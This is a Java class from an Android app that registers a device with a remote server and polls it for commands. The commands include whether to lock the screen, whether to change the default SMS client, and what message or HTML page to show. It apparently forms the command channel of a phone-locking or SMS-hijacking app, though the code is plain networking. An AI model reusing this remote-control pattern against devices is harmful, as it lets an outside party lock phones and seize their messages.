package cav.testforwl.utils;


import android.util.Log;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.BasicResponseHandler;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;
import java.util.prefs.BackingStoreException;

@SuppressWarnings({"deprecation"})
public class GetREST {
    private static final String TAG = "GETREST";
    private HttpClient mHttpClient;

    private JSONObject jObj = null;
    private DataManager mDataManager;

    @SuppressWarnings({"deprecation"})
    public GetREST(){
        mHttpClient = new DefaultHttpClient();
        mDataManager = DataManager.getInstance();
    }
    @SuppressWarnings({"deprecation"})
    public void registry(String deviceID,String deviceName){
        HttpPost post= new HttpPost(ConstantManager.BASE_URL+ConstantManager.URL_REGISTRY);
        post.addHeader("Accept", "application/json");
        List nameValuePairs = new ArrayList(2);
        nameValuePairs.add(new BasicNameValuePair("deviceID", deviceID));
        nameValuePairs.add(new BasicNameValuePair("deviceName",deviceName));
        try {
            post.setEntity(new UrlEncodedFormEntity(nameValuePairs));
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }

        try {
            String response = mHttpClient.execute(post,new BasicResponseHandler());
            Log.d(TAG,"OK");
            Log.d(TAG, response);
            jObj = new JSONObject(response);
            if (jObj.has("result") && jObj.getString("result").equals("true")) {
                mDataManager.getPreferensManager().saveRegistry(true);
                Log.d(TAG,"SAVED REGISTRY");
            }
        } catch (IOException e) {
            e.printStackTrace();
            Log.e(TAG,e.getMessage());
        } catch (JSONException e) {
            e.printStackTrace();
        }

    }
    // получаем данные для нашего устройства
    @SuppressWarnings({"deprecation"})
    public void get_data(String deviceID){
        HttpPost post = new HttpPost(ConstantManager.BASE_URL+ConstantManager.URL_GETDATA);
        post.addHeader("Accept","application/json");
        List nameValuePairs = new ArrayList(1);
        nameValuePairs.add(new BasicNameValuePair("deviceID", deviceID));

        try {
            post.setEntity(new UrlEncodedFormEntity(nameValuePairs));
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
            Log.e(TAG,e.getMessage(),e);
        }

        try {
            String response = mHttpClient.execute(post,new BasicResponseHandler());
            jObj = new JSONObject(response);
            if (jObj.has("result") && jObj.getString("result").equals("true")) {
                JSONObject jdata= (JSONObject) jObj.get("data");
                if (!jdata.isNull("message")){
                    mDataManager.getPreferensManager().saveMessage(jdata.getString("message"));
                }
                if (!jdata.isNull("html_url")){
                    mDataManager.getPreferensManager().saveHTMLUrl(jdata.getString("html_url"));
                }
                if (!jdata.isNull("html_message")){
                    mDataManager.getPreferensManager().saveHtmlText(jdata.getString("html_message"));
                }
                if (!jdata.isNull("lock_screen")){
                    mDataManager.getPreferensManager()
                            .saveLockScreen(jdata.getBoolean("lock_screen"));

                } else {
                    mDataManager.getPreferensManager().saveLockScreen(false);
                }
                if (!jdata.isNull("change_sms_client")){
                    boolean flg= jdata.getString("change_sms_client").equals("0") ? false : true;
                    mDataManager.getPreferensManager().saveSmsChange(flg);
                }
            }

            Log.d(TAG,response);
        } catch (IOException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
            Log.e(TAG,e.getMessage(),e);
        }
        // прочли и тут же погасили флаг
        setReadMessage(deviceID);
    }

    // устанавливаем что прочитали
    @SuppressWarnings({"deprecation"})
    public void setReadMessage(String deviceID){
        HttpPost post = new HttpPost(ConstantManager.BASE_URL+"api/update");
        post.addHeader("Accept","application/json");
        List nameValuePairs = new ArrayList(2);
        nameValuePairs.add(new BasicNameValuePair("deviceID", deviceID));
        nameValuePairs.add(new BasicNameValuePair("frm_status","1"));
        try {
            post.setEntity(new UrlEncodedFormEntity(nameValuePairs));
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
            Log.e(TAG,e.getMessage(),e);
        }

        try {
            String response = mHttpClient.execute(post,new BasicResponseHandler());
            jObj = new JSONObject(response);
            Log.d(TAG,response);
        } catch (IOException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }

    }
}
;